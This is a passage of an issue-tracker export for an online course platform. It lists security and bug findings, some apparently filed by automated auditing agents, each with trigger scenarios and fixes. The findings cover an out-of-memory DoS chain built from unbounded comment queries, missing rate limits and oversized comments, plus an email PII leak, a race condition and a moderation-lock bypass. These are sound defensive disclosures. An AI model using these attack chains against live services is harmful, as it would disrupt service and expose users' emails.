* Decide cadence (weekly is typical) and whether to group all base-image bumps into one PR to reduce churn.
* Optional alternative: a scheduled GitHub Action running `docker buildx imagetools inspect` + a digest-rewrite script, if Dependabot's compose coverage proves insufficient.

## Acceptance

* A bot opens PRs when a newer digest exists for any pinned `node:26.3.0-*` / `alpine:3.23.*` image.
* The two canonical Node digests (bookworm-slim `…1212a16`, alpine3.23 `…2a8541`) and the cron `alpine:3.23.4` digest are all tracked.

## Affected paths

`.github/dependabot.yml` (new), all `apps/*/Dockerfile*`, `docker/{production,staging}/docker-compose*.yml`

Related: [EXP-282](https://linear.app/experts/issue/EXP-282/security-pin-version-pump-all-container-base-images-node-2630-digest) (the sweep this follows up).

Title: [bug] handleCourseSubmit read+write not atomic — concurrent submits will bypass state guards once EXP-278 is fixed
Description:
R3 fingerprint: `<!-- agent-fp: 4cbf93d87242 -->`.

**Severity**: Medium

**File**: `apps/experts-app/src/lib/courses/catalog/handlers/course-submit.handler.ts` — `handleCourseSubmit`

**Root cause**: The handler reads `publishingStatus`/`approvalStatus` in a `findUnique` and then writes in a separate `update` with no enclosing transaction and no optimistic lock. Two concurrent submit requests both pass the guards (both reads observe the pre-write state) and both writes land. Today the writes are idempotent (`{publishingStatus: "submitted", approvalStatus: "pending"}`), so no corruption occurs. But once [EXP-278](https://linear.app/experts/issue/EXP-278/bug-handlecoursesubmit-missing-pending-guard-instructor-can-double) is fixed by adding a `publishingStatus !== "submitted"` guard, this TOCTOU gap becomes a live double-submit bypass: both concurrent requests observe `"rejected"` before either write lands, both pass the guard, and both succeed even though only one should.

**Trigger scenario**:

Prerequisites: Course `course-A` is in `{publishingStatus: "rejected", approvalStatus: "rejected"}`. The [EXP-278](https://linear.app/experts/issue/EXP-278/bug-handlecoursesubmit-missing-pending-guard-instructor-can-double) fix has been applied.

Two concurrent HTTP requests (e.g., double-click on "Re-submit" button):

```
POST /api/v1/creator/courses/course-A/submit  (request 1)
POST /api/v1/creator/courses/course-A/submit  (request 2 — in-flight simultaneously)
```

Both `findUnique` calls observe `publishingStatus: "rejected"` → both pass the guard → both `update` calls land → course submits twice. The review queue receives a duplicate submission signal.

**Suggested fix**: Wrap the `findUnique` + `update` in a `prisma.$transaction()`, or add an optimistic lock by including `where: {id: courseId, publishingStatus: {not: "submitted"}}` in the `update` call — if the condition no longer holds, Prisma will return `null` (with `updateMany`) or throw, and the caller can return 409.

Related prior issues: [EXP-278](https://linear.app/experts/issue/EXP-278/bug-handlecoursesubmit-missing-pending-guard-instructor-can-double)

Verified by: workflow-orchestrator subagent

*Filed by automated bug-finder routine on 2026-06-02T21:30:00Z.*

Title: [bug] community posts GET popular/discussed: totalPosts reflects full DB count but only 500 posts are navigable
Description:
R3 fingerprint: `<!-- agent-fp: 07a618296c89 -->`.

**Severity**: Medium

**File**: `apps/experts-app/app/api/v1/community/posts/route.ts` — `GET`

**Root cause**: The [EXP-242](https://linear.app/experts/issue/EXP-242/bug-community-posts-get-loads-all-posts-without-limit-for) fix (PR #768, commit ba220ef) correctly caps `totalPages` via `reachableTotal = Math.min(totalPosts, INMEM_SORT_CAP)` for popular/discussed sorts, but the response still returns the raw uncapped `totalPosts` (full DB count). The community page (`app/(i18n)/_shared/community/page.tsx` lines 732–733) uses `totalPosts` directly for "Showing X–Y of Z" display text and passes it to `<FilterSidebar totalPosts={totalPosts} />`. Since only the newest 500 posts are fetched for in-memory sorts, the displayed count is false and `currentPage` can exceed `totalPages` in the same response body.

**Trigger scenario**:

Prerequisites: 750 published posts in DB.

```
GET /api/v1/community/posts?sort=popular&page=1&limit=10
→ { posts: [...10], totalPosts: 750, totalPages: 50, currentPage: 1 }
```

UI renders "Showing 1–10 of **750** posts" — 250 of those posts are unreachable under this sort.

```
GET /api/v1/community/posts?sort=popular&page=60&limit=10
→ { posts: [], totalPages: 50, currentPage: 60 }
```

`currentPage: 60` exceeds `totalPages: 50` in the same response — inconsistent pagination contract; any client that checks `currentPage > totalPages` would fail.

**Suggested fix**: For non-recent sorts, substitute `reachableTotal` for `totalPosts` in the response, or expose both (`navigablePosts: reachableTotal, totalPosts`) so clients can choose the correct value for display vs. analytics.

Related prior issues: [EXP-257](https://linear.app/experts/issue/EXP-257/spinoff-exp-242-community-posts-get-totalpages-incoherent-for-in)

Title: [security] Community post detail GET — unbounded comment fetch OOM DoS
Description:
R3 fingerprint: `<!-- agent-fp: 47a8e3572d1a -->`.

## Severity

Medium

## Location

`apps/experts-app/app/api/v1/community/posts/[id]/route.ts` — `GET` handler (lines \~59–67)

## Attacker → Input → Reach → Impact

**Attacker:** Unauthenticated caller. `GET /api/v1/community/posts/{id}` is fully public — no session required.

**Controlled input:** A post UUID on a post with many comments. Comment count is drivable by an authenticated attacker via [EXP-281](https://linear.app/experts/issue/EXP-281/security-community-post-creation-post-has-no-rate-limit-authenticated) (no rate limit on comment creation). The comment body has no content-length validation, so each comment can carry arbitrarily large TEXT payloads (separate finding filed alongside this one).

**Reachable path:**

```
GET /api/v1/community/posts/{id}
  → prisma.comment.findMany({ where: { postId: id }, include: { author: { include: userBasicInclude } }, orderBy: { createdAt: "desc" } })
      ← NO take bound — all N comments loaded into Node.js heap
  → getLikes("comment", comments.map(c => c.id))
      ← IN-list expands linearly with N
  → prisma.like.findMany({ contentId: { in: comments.map(c => c.id) } })
      ← second N-sized IN-list query
  → in-process commentsMap construction + tree build + reply sort  [O(N) heap]
```

**Impact:** All N comment rows with full `author + profile` joins are deserialized into Node.js heap memory before JSON serialization. With large spam comments (enabled by [EXP-281](https://linear.app/experts/issue/EXP-281/security-community-post-creation-post-has-no-rate-limit-authenticated) + no content-length cap), repeated GET requests exhaust the process heap → OOM crash → entire Next.js process terminates → full service disruption for all concurrent users. No container memory limit exists ([EXP-274](https://linear.app/experts/issue/EXP-274/infra-add-container-memory-limits-postgres-memory-tuning-postgres-and) open), so the OOM can cascade to co-located Redis/Postgres processes.

No cache read guard exists on this path: the handler never reads from `postsCache` or `commentsCache` before issuing the query — every request is a live Postgres round-trip.

## Recommended remediation

* Add `take: 200` (or a configurable `COMMENTS_PAGE_LIMIT`) + cursor-based pagination to `prisma.comment.findMany`.
* Add Zod content-length validation on comment creation: `content: z.string().max(5000)`.
* Add a cache-read guard at the top of the handler.
* Apply the same `take` bound to `GET /api/v1/community/posts/{id}/comments` (same unbounded pattern, separate route — see companion finding).

## Related prior issues

[EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished) (resolved — draft disclosure on same GET handler), [EXP-242](https://linear.app/experts/issue/EXP-242/bug-community-posts-get-loads-all-posts-without-limit-for) (resolved — unbounded posts list GET)

## Verified by

security-auditor, architecture-reviewer

Title: [security] Community comments GET — unbounded findMany with no cache read enables unauthenticated OOM DoS
Description:
R3 fingerprint: `<!-- agent-fp: d1b9205afee9 -->`.

## Severity

Medium

## Location

`apps/experts-app/app/api/v1/community/posts/[id]/comments/route.ts` — `GET` handler

## Attacker → Input → Reach → Impact

**Attacker:** Unauthenticated caller. `GET /api/v1/community/posts/{id}/comments` is fully public.

**Controlled input:** A post UUID on a post with many comments. Comment count is drivable via [EXP-281](https://linear.app/experts/issue/EXP-281/security-community-post-creation-post-has-no-rate-limit-authenticated) (no rate limit on comment creation) combined with no content-length validation on the POST handler (companion finding).

**Reachable path:**

```
GET /api/v1/community/posts/{id}/comments
  → prisma.comment.findMany({ where: { postId }, include: { author: { select: ... } }, orderBy: { createdAt: "desc" } })
      ← NO take bound — all N comments loaded
  → getLikes("comment", commentIds)       ← IN-list scales with N
  → prisma.like.findMany({contentId: {in: commentIds}})  ← second N-sized IN-list
  → commentsMap build + tree construction + reply sort   ← O(N) heap
  → commentsCache.setComments(postId, ...) AFTER the DB hit (write-only; no read guard at top)
```

**Impact:** Identical to [EXP-288](https://linear.app/experts/issue/EXP-288/security-community-post-detail-get-unbounded-comment-fetch-oom-dos) (`GET /posts/{id}`) but a distinct endpoint with its own unbounded query. Critically, a `commentsCache` infrastructure exists and is populated by this endpoint — but there is **no cache read guard at the top of the handler**. Every request, including ones that hit within the 5-minute TTL window after a previous identical request, issues a full Prisma `findMany` against Postgres. The cache write happens after the expensive DB fetch, so it provides zero protection against repeated calls.

Result: unauthenticated callers can trigger repeated full DB scans of all comments for a post → memory exhaustion → OOM → service outage.

## Recommended remediation

* Add `take: 200` (configurable) + cursor-based pagination to `prisma.comment.findMany`.
* Add a cache-read guard before the DB query: read from `commentsCache.getComments(postId)` and return the cached result if present, skipping the DB call.
* Coordinate with [EXP-288](https://linear.app/experts/issue/EXP-288/security-community-post-detail-get-unbounded-comment-fetch-oom-dos) fix so both GET endpoints enforce the same comment pagination contract.

Title: [security] Community comments POST — no input validation allows unbounded content blobs and amplifies DoS chain
Description:
R3 fingerprint: `<!-- agent-fp: f0979bbccfad -->`.

## Severity

Medium

## Location

`apps/experts-app/app/api/v1/community/posts/[id]/comments/route.ts` — `POST` handler

## Attacker → Input → Reach → Impact

**Attacker:** Any authenticated user (account required; trivial to obtain).

**Controlled input:** `body.content` (no length cap — Postgres column is `TEXT NOT NULL`, unlimited) and `body.parentId` (no UUID validation — passed directly to `prisma.comment.create`).

**Reachable path:**

```
POST /api/v1/community/posts/{id}/comments
  body = await request.json()   ← raw, no Zod schema
  prisma.comment.create({ data: { content: body.content, parentId: body.parentId, ... } })
    body.content: no max length → arbitrarily large TEXT stored in Postgres
    body.parentId: no UUID format check → malformed value → Prisma P2023 → 500 (safeErrorJson
                   suppresses internals, but correct response is 400)
```

**Impact (two distinct vectors):**

1. **DB storage exhaustion / response-size amplification:** `body.content` is written to Postgres without a length constraint. An attacker with a single account can create comments carrying hundreds-of-KB payloads. Combined with [EXP-288](https://linear.app/experts/issue/EXP-288/security-community-post-detail-get-unbounded-comment-fetch-oom-dos)/[EXP-289](https://linear.app/experts/issue/EXP-289/security-community-comments-get-unbounded-findmany-with-no-cache-read) (unbounded GET reads), each oversized comment multiplies the memory cost of every future GET request against that post → amplifies the unbounded-read OOM attack from medium to high exploitation speed.
2. **Incorrect error code on bad** `parentId`**:** A non-UUID `parentId` causes Prisma to throw `P2023` (Inconsistent column data). `safeErrorJson` correctly suppresses ORM internals, but returns HTTP 500 instead of 400 — clients cannot distinguish a server error from a validation error.

## Recommended remediation

* Add a Zod schema on the POST body: `z.object({ content: z.string().min(1).max(5000), parentId: z.string().uuid().optional() })`.
* Validate the route param `postId` via `routeParamsWithIdSchema` (already used in the companion GET handler but missing from POST).
* Return 400 on validation failures rather than allowing Prisma to throw.

## Related prior issues

[EXP-288](https://linear.app/experts/issue/EXP-288/security-community-post-detail-get-unbounded-comment-fetch-oom-dos) (open — unbounded GET /posts/{id}), [EXP-289](https://linear.app/experts/issue/EXP-289/security-community-comments-get-unbounded-findmany-with-no-cache-read) (open — unbounded GET /posts/{id}/comments), [EXP-281](https://linear.app/experts/issue/EXP-281/security-community-post-creation-post-has-no-rate-limit-authenticated) (open — rate limit missing on post creation; same gap class)

Title: [cluster] Community posts & comments API hardening
Description:
Umbrella for the community **posts + comments** API hardening cluster — authz gaps, unbounded queries (OOM DoS chain), input validation, and pagination correctness. Pick the nest, work it as **3 file-scoped PRs** (same-file issues bundle into one PR; see \[\[feedback_cluster_shared_file_bundling\]\] discipline).

## Sub-issues by file → PR

**PR 1 —** `apps/experts-app/app/api/v1/community/posts/route.ts`

* [EXP-281](https://linear.app/experts/issue/EXP-281/security-community-post-creation-post-has-no-rate-limit-authenticated) — POST has no rate limit (authenticated DoS / spam; amplifies the comment-OOM chain)
* [EXP-286](https://linear.app/experts/issue/EXP-286/bug-community-posts-get-populardiscussed-totalposts-reflects-full-db) — GET popular/discussed: real `totalPosts` vs 500-capped navigable; `currentPage` can exceed `totalPages` (residual of [EXP-257](https://linear.app/experts/issue/EXP-257/spinoff-exp-242-community-posts-get-totalpages-incoherent-for-in))

* [EXP-277](https://linear.app/experts/issue/EXP-277/bug-community-posts-delete-has-no-admin-bypass-admin-moderation-and) — DELETE has no admin bypass (moderation / GDPR erasure blocked)
* [EXP-280](https://linear.app/experts/issue/EXP-280/security-community-post-put-allows-owner-to-reverse-admin-unpublish) — PUT lets owner reverse admin unpublish (needs `Post.adminLockedAt`); moderation bypass
* [EXP-287](https://linear.app/experts/issue/EXP-287/bug-get-communitypostsid-auth-moved-outside-try-block-unhandled) — GET: `auth()` + `getUserPermissions()` outside the try ([EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished) regression) → unhandled throw bypasses `safeErrorJson`
* [EXP-288](https://linear.app/experts/issue/EXP-288/security-community-post-detail-get-unbounded-comment-fetch-oom-dos) — GET: unbounded `comment.findMany` (no `take`, no cache read) → unauthenticated OOM DoS

**PR 3 —** `apps/experts-app/app/api/v1/community/posts/[id]/comments/route.ts`

* [EXP-289](https://linear.app/experts/issue/EXP-289/security-community-comments-get-unbounded-findmany-with-no-cache-read) — GET: unbounded `comment.findMany`, cache is write-only (no read guard) → unauthenticated OOM DoS
* [EXP-290](https://linear.app/experts/issue/EXP-290/security-community-comments-post-no-input-validation-allows-unbounded) — POST: raw body, no Zod schema (unbounded `content` TEXT, no `parentId` UUID check) → DB-storage exhaustion + wrong 500-on-bad-parentId; **amplifies 288/289**

## Cross-cutting notes

* **OOM attack chain:** [EXP-290](https://linear.app/experts/issue/EXP-290/security-community-comments-post-no-input-validation-allows-unbounded) (oversized comments) × [EXP-281](https://linear.app/experts/issue/EXP-281/security-community-post-creation-post-has-no-rate-limit-authenticated) (no comment/post rate limit) × [EXP-288](https://linear.app/experts/issue/EXP-288/security-community-post-detail-get-unbounded-comment-fetch-oom-dos)/289 (unbounded reads) compound — fixing any one alone is partial. The comment-pagination contract (`take: 200` + cursor) must be applied identically in 288 **and** 289.
* **Schema dependency:** [EXP-280](https://linear.app/experts/issue/EXP-280/security-community-post-put-allows-owner-to-reverse-admin-unpublish)'s durable fix wants a `Post.adminLockedAt` migration — sequence that PR's migration ahead of deploy.

Title: [product] Course moderation model — instant publish + reactive takedown + cert-lane review
Description:
**Decision recorded 2026-06-04 (see below).** Originally filed as product/design tracking for the intentional create-time auto-approve surfaced while triaging [EXP-226](https://linear.app/experts/issue/EXP-226/spinoff-exp-213-course-create-route-hardcodes-approvalstatus-approved).

## ✅ Decision (operator-confirmed 2026-06-04): risk-based moderation, not a blanket queue

Resolves the retire-vs-build question. Experts is **marketplace-shaped** (shared catalog / search / recommendations + certification claims) but runs creator-storefront speed. Rather than keep the ambiguous half-state — dead `submit/pending` machinery bypassed by auto-approve, which is the root cause of [EXP-318](https://linear.app/experts/issue/EXP-318/bug-creator-create-and-build-curriculum-fails-with-409-createsubmit) — adopt the risk-based model lean marketplaces actually run:

1. **Default = instant publish.** Normal instructor courses auto-approve at create; the lifecycle collapses to `draft → published`. The blanket pre-publish review queue is **retired**.
2. **Reactive post-publish moderation is the primary safety net** — report + admin takedown via the `adminLockedAt` primitive already built for community posts ([EXP-280](https://linear.app/experts/issue/EXP-280/security-community-post-put-allows-owner-to-reverse-admin-unpublish) / [EXP-295](https://linear.app/experts/issue/EXP-295/bug-owner-can-delete-admin-locked-post-moderation-lock-not-enforced-in)). This is where marketplace moderation effort actually goes.
3. **Real pre-publish review is reserved for** `recognitionType: ACADEMIC` **(certification-bearing) courses only** — where the platform vouches for a credential. The existing `submit → pending → approve` state machine (today wired to nothing) gets **scoped to this lane** instead of being retired.

Net: removes the dead-code tension, reuses primitives we already have (`adminLockedAt` takedown, certification levels / `recognitionType` guard), and matches how Udemy/Skillshare-class marketplaces gate — review the high-stakes slice, react on the rest — without building a heavy queue for the \~95% trusted case.

## Follow-up work (this issue is now the implementation tracker)

- [ ] **Normal path → collapse to** `draft → published`**.** The vestigial create→submit call is already removed for the create UI in [EXP-318](https://linear.app/experts/issue/EXP-318/bug-creator-create-and-build-curriculum-fails-with-409-createsubmit) / PR [logi-x/experts#837](https://linear.app/experts/review/fixcreator-course-createbuild-must-not-call-submit-exp-318-057691504d7c). Confirm no other caller depends on `submitted`/`pending` for non-cert courses.
- [ ] **Cert lane → wire** `submit/pending/approve` **to** `recognitionType: ACADEMIC` **only.** ACADEMIC course create starts `draft`; instructor submits → `pending`; admin approves → publishable. Non-ACADEMIC courses bypass review entirely.
- [ ] **Create-time default by recognitionType** in `course-create.handler.ts` — replace the blanket `|| "approved"` with `ACADEMIC → "draft"`, else `"approved"`; keep the admin fast-path.
- [ ] **Reactive takedown for courses** — mirror the community `adminLockedAt` lock/takedown on the course admin-unpublish path.
- [ ] **Re-scope** [EXP-278](https://linear.app/experts/issue/EXP-278/bug-handlecoursesubmit-missing-pending-guard-instructor-can-double) (submit double-submit guard) and [EXP-235](https://linear.app/experts/issue/EXP-235/admin-can-approve-a-rejected-course-directly-bypassing-re-submission) (re-approve guard) to the cert review lane — they remain valid *there*, not for the retired blanket queue.

## Relation note

[EXP-292](https://linear.app/experts/issue/EXP-292/product-course-moderation-model-instant-publish-reactive-takedown-cert) still `blocks` [EXP-278](https://linear.app/experts/issue/EXP-278/bug-handlecoursesubmit-missing-pending-guard-instructor-can-double) + [EXP-235](https://linear.app/experts/issue/EXP-235/admin-can-approve-a-rejected-course-directly-bypassing-re-submission), but the decision **defines the lane** they live in: both are now scoped to the ACADEMIC cert-review path. They can proceed once the cert lane (step 2) lands; lift the `blocks` at that point.

---

## Current behavior as-built (operator-confirmed 2026-06-03)

Instructor-created courses are created with `approvalStatus: "approved"` — no moderation gate at create time:

* `apps/experts-app/app/api/v1/courses/route.ts` (POST) passes `approvalStatus: "approved"` explicitly.
* `apps/experts-app/src/lib/courses/catalog/handlers/course-create.handler.ts:98` defaults `approvalStatus` to `"approved"` (fallback for non-route callers; carries a `TODO(EXP-292)` note).

This is what the Decision above formalizes (and cleans up).

## Implementation detail for the cert lane

* ACADEMIC courses start `approvalStatus: "draft"` (matching `course-clone.handler.ts:109`, schema `@default(draft)`, and `publishingStatus: "draft"`), **not** `"pending"` — `pending` is the post-*submit* state set by `course-submit.handler.ts`. The submit path is the moderation entry point for this lane.
* Admin-created courses keep an explicit `approved` fast-path (`actor.isAdmin ? "approved" : …`).

Related: [EXP-226](https://linear.app/experts/issue/EXP-226/spinoff-exp-213-course-create-route-hardcodes-approvalstatus-approved) (closed by-design — create-time auto-approve), [EXP-214](https://linear.app/experts/issue/EXP-214/spinoff-exp-199-course-submit-handler-hardcodes-approvalstatus) (submit-path moderation, resolved), [EXP-213](https://linear.app/experts/issue/EXP-213/spinoff-exp-199-jwt-role-staleness-on-course-create-route-post) (course-create DB-fresh role family), [EXP-318](https://linear.app/experts/issue/EXP-318/bug-creator-create-and-build-curriculum-fails-with-409-createsubmit) (the create→submit 409 regression this decision prevents recurring).

Title: [security] auth()/getUserPermissions() before try bypasses safeErrorJson — 37-handler class + lint rule
Description:
R3 fingerprint (class): `<!-- agent-fp: a5301e354c25 -->`.

**Severity**: Medium (defense-in-depth / consistency class — not 37 confirmed live leaks).

## The class

`safeErrorJson()` is the platform's error-sanitization choke point — it logs full detail server-side and returns a generic public message. It's the #1 god node in the API graph (269 edges, betweenness 0.237). For it to protect a handler, the throwable work must be **inside** the handler's `try`.

[EXP-287](https://linear.app/experts/issue/EXP-287/bug-get-communitypostsid-auth-moved-outside-try-block-unhandled) found one handler (`community/posts/[id]/route.ts` GET) where `auth()` / `getUserPermissions()` were lifted **above** the `try` (by the [EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished) fix), so a throw there returns a raw framework 500 and bypasses the sanitizer. This is the **whole class**: a sweep found **37 handlers** under `app/api/v1` that call `safeErrorJson` but invoke `auth()` and/or `getUserPermissions()` before the first `try`.

Discovered via the graphify god-node trace (see `graphify-out/safeErrorJson-audit.md`).

## Generalized fix (class-level, not 37 patches)

1. **Move** `auth()` **/** `getUserPermissions()` **inside the** `try` in each handler (or wrap them), so any throw routes through `safeErrorJson`. Mechanical, behavior-preserving.
2. **Ship an ESLint rule** (`no-auth-before-try` / custom) that flags `await auth(` or `getUserPermissions(` appearing before the first `try` in an `app/api/**/route.ts` handler — so the class can't reappear. This is the durable win.

## Affected handlers (37)

**courses (17)**

* `courses/[id]/approve` `archive` `clone` `enroll` `publish` `reject` `submit`
* `courses/[id]/modules/[moduleId]/items/reorder`, `modules/reorder`, `modules/[moduleId]/lessons/route`, `lessons/reorder`, `lessons/bulk`, `lessons/[lessonId]/move`, `lessons/[lessonId]/prerequisites`, `lessons/[lessonId]/watch-progress`, `modules/[moduleId]/quizzes/route`, `quizzes/[quizId]`

**creator (10)**

* `creator/courses/[id]/route`, `course-assets/route`, `course-assets/[assetId]`, `exams/route`, `exams/[examId]`, `exams/[examId]/reset`, `modules/[moduleId]/lessons/[lessonId]/lesson-assets/route` + `[assetId]`, `modules/[moduleId]/module-assets/route` + `[assetId]`

**community (4)** — *overlap with* [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening) *cluster; these get fixed in that cluster's PRs*

* `community/posts/route`, `community/posts/[id]/route` (= [EXP-287](https://linear.app/experts/issue/EXP-287/bug-get-communitypostsid-auth-moved-outside-try-block-unhandled) seed), `community/posts/[id]/comments/route`, `community/comments/[commentId]/route`

**other (6)**

* `course-exams/[id]/start`, `course-exams/attempts/[id]/submit`, `quizzes/[id]/start`, `recommendations/personalized`, `internal/realtime/sync`, `user/deactivate`

## Scope notes

* The 4 community handlers overlap [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening)'s same-file bundle — fix them there; this issue owns the **other 33 + the lint rule**.
* [EXP-287](https://linear.app/experts/issue/EXP-287/bug-get-communitypostsid-auth-moved-outside-try-block-unhandled) is the seed instance (already nested under [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening)). It can close with the community PR; this issue's lint rule prevents the whole class recurring.

## Caveats (honesty)

* Detection is a **heuristic** (first `auth()`/`getUserPermissions()` byte-offset vs. first `try` offset). `auth()` throwing is rare (degraded session provider, JWT-secret misconfig, DB hiccup), so this is defense-in-depth, **not 37 confirmed live bugs**.
* Baseline is good: a parallel audit found **0** handlers leaking `error.message` directly in a response ([EXP-201](https://linear.app/experts/issue/EXP-201/harden-payment-provider-error-details-before-returning-checkout) class clean). This class is about closing the residual escape path + locking it with lint.

Related: [EXP-287](https://linear.app/experts/issue/EXP-287/bug-get-communitypostsid-auth-moved-outside-try-block-unhandled) (seed instance), [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening) (community cluster — overlapping 4 handlers), [EXP-254](https://linear.app/experts/issue/EXP-254/security-get-communitypostsid-returns-draft-posts-missing-ispublished) (introduced the seed), [EXP-201](https://linear.app/experts/issue/EXP-201/harden-payment-provider-error-details-before-returning-checkout) (the leak class this sanitizer prevents).

*Filed from the 2026-06-03 graphify god-node audit of* `safeErrorJson`*.*

Title: [security] Community comment & post author email exposed to unauthenticated callers (PII)
Description:
R3 fingerprint: `<!-- agent-fp: 62b3ed0583aa -->`.

## Severity

Medium — PII (email address) disclosure to the unauthenticated public internet.

## Surfaced by

In-routine security-auditor review during the [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening) cluster (PR #793 / [EXP-289](https://linear.app/experts/issue/EXP-289/security-community-comments-get-unbounded-findmany-with-no-cache-read)). **Pre-existing** — the live public GET already returned author emails to anonymous callers before that PR; the cluster work did not introduce it, so it was deliberately filed separately rather than smuggled into the cluster PRs.

## Locations (multi-site)

* `apps/experts-app/app/api/v1/community/posts/[id]/comments/route.ts` — GET selects `author.email` (Prisma `select`), copies it into each comment node, returns it (and now caches it for unauthenticated callers).
* `apps/experts-app/app/api/v1/community/posts/[id]/route.ts` — GET (post detail) returns comment author `email` the same way.
* `apps/experts-app/src/lib/redis.ts` — `CommentData` (and `PostData.author`) declare `email: string`, so the field is part of the cached public payload schema.

## Attacker → Impact

Any unauthenticated caller hits `GET /api/v1/community/posts/{id}/comments` (or the post-detail GET). The response contains `author.email` for every commenter — up to `COMMENT_FETCH_CAP` (200) emails per request — harvestable by crawlers. Enables spam/phishing against the user base; email-minimisation concern under PDPL/GDPR.

## Suggested fix

Drop `email` from the comment-author projection in both GET routes and from the `CommentData` / `PostData.author` shapes in `redis.ts`. The community UI renders `id` / `username` / `fullName` / `avatarUrl` — confirm no consumer reads `author.email` first (frontend grep), since this is a public-API contract change spanning both comment endpoints. After deploy, invalidate warm `commentsCache` keys (5-min TTL) so cached entries stop serving emails.

## Why Backlog (not Todo)

Blocked on a scoping decision: confirm `author.email` has no required consumer, and coordinate the change across both routes + the shared redis DTOs in one diff. Flip to Todo once that's confirmed.

Related: [EXP-289](https://linear.app/experts/issue/EXP-289/security-community-comments-get-unbounded-findmany-with-no-cache-read) (where it was surfaced), [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening) (cluster), [EXP-274](https://linear.app/experts/issue/EXP-274/infra-add-container-memory-limits-postgres-memory-tuning-postgres-and) (container memory limits — adjacent OOM hardening).
Creator: loooogix@gmail.com

Title: [bug] owner can delete admin-locked post — moderation lock not enforced in DELETE
Description:
R3 fingerprint: `<!-- agent-fp: 4443149a35c8 -->`.

---

## 🗂 Cluster anchor — Community moderation-lock & author-email PII (round 2)

This issue doubles as the **nest anchor** ("pick one, work the nest") for the round-2 community hardening cluster spun out of \[\[[EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening)\]\] (Done — PR [EXP-291](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening)). Every child below was surfaced while working that cluster. Two recurring root causes:

1. `adminLockedAt` **not enforced everywhere.** PR [logi-x/experts#792](https://linear.app/experts/review/fixcommunity-admin-moderation-oomerror-hardening-on-post-detail-linear-893fe7fa30cf) ([EXP-280](https://linear.app/experts/issue/EXP-280/security-community-post-put-allows-owner-to-reverse-admin-unpublish)) added the `Post.adminLockedAt` column and gated the PUT + thumbnail paths — but several other write paths still don't check it.
2. **Author-email PII leak recurs** across multiple public read endpoints (the `select` projection includes `user.email`).

Work it as **file-scoped PRs** — same-file issues bundle into one PR (see `feedback_cluster_shared_file_bundling`).

### PR A — `community/posts/[id]/route.ts` (moderation-lock)

* [EXP-295](https://linear.app/experts/issue/EXP-295/bug-owner-can-delete-admin-locked-post-moderation-lock-not-enforced-in) (this anchor) — DELETE doesn't fetch/check `adminLockedAt`
* [EXP-296](https://linear.app/experts/issue/EXP-296/bug-toctou-race-in-put-postsid-allows-non-admin-to-bypass-moderation) — TOCTOU race in PUT lets non-admin bypass the lock

### PR B — upload paths (moderation-lock)

* [EXP-297](https://linear.app/experts/issue/EXP-297/bug-toctou-in-thumbnail-upload-bypasses-moderation-lock-orphans-r2) — TOCTOU in thumbnail upload bypasses the lock, orphans the R2 asset
* [EXP-300](https://linear.app/experts/issue/EXP-300/bug-post-internalupload-community-case-ignores-adminlockedat) — POST `/internal/upload` community case ignores `adminLockedAt`

### PR C — `community/posts/[id]/comments/route.ts`

* [EXP-298](https://linear.app/experts/issue/EXP-298/security-get-postsidcomments-has-no-post-visibility-check-moderated) — GET has no post-visibility check (moderation leak)
* [EXP-299](https://linear.app/experts/issue/EXP-299/bug-post-communitypostsidcomments-has-no-rate-limit-authenticated-spam) — POST has no rate limit (authenticated DoS/spam)
* [EXP-301](https://linear.app/experts/issue/EXP-301/bug-get-postsidcomments-silently-truncates-beyond-200-no-hasmore) — GET silently truncates beyond 200, no `hasMore`/cursor

### PR D — author-email PII (public read endpoints)

* [EXP-294](https://linear.app/experts/issue/EXP-294/security-community-comment-and-post-author-email-exposed-to) — post/comment detail ⚠️ **needs-rework, currently in Todo**
* [EXP-310](https://linear.app/experts/issue/EXP-310/spinoff-exp-294-community-embeds-endpoint-exposes-post-author-email-to) — community embeds endpoint
* [EXP-311](https://linear.app/experts/issue/EXP-311/spinoff-exp-294-community-post-list-endpoint-leaks-author-email-via) — community post-list endpoint
* [EXP-312](https://linear.app/experts/issue/EXP-312/spinoff-exp-294-hashtagsearch-endpoint-leaks-post-and-comment-author) — hashtag/search endpoint

**Sequencing notes:** PR A and PR B both gate on `adminLockedAt` — mirror this issue's `select: {adminLockedAt: true}` + 403 guard. PR D shares one author-`select` projection fix; apply a single shared helper so the leak can't reappear (and finish the [EXP-294](https://linear.app/experts/issue/EXP-294/security-community-comment-and-post-author-email-exposed-to) rework here rather than leaving it stranded).

---

## Trigger scenario

1. Admin sends `PUT /api/v1/community/posts/{id}` with `{"isPublished": false}` → post stamped with `adminLockedAt = new Date()`, removed from public feed.
2. Post owner immediately sends `DELETE /api/v1/community/posts/{id}` — no concurrency or timing required.
3. DELETE handler queries `prisma.post.findUnique({ where: {id}, select: {userId: true} })` — `adminLockedAt` is not in `select` and is never checked.
4. Ownership check passes. Post is hard-deleted: moderation record destroyed, DB row gone, cache invalidated, feed event fires as if the owner voluntarily removed content.

Exploitability: **easy** — single authenticated request, 100% reproducible with zero tooling beyond a curl call using the post owner's session token.

## Root cause

`apps/experts-app/app/api/v1/community/posts/[id]/route.ts`, DELETE handler (\~line 395):

```typescript
const post = await prisma.post.findUnique({
  where: {id},
  select: {userId: true},  // adminLockedAt omitted — lock never fetched or checked
});
// only ownership + isAdmin checked
await prisma.post.delete({where: {id}});
```

